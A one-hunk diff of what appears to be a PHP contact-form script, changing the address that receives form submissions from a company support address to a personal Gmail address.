@@ -6,7 +6,7 @@
 
 
 // an email address that will receive the email with the output of the form
-$sendTo = 'support@media-experts.net';
+$sendTo = 'ichfak.ichfak99@gmail.com';
 
 
 
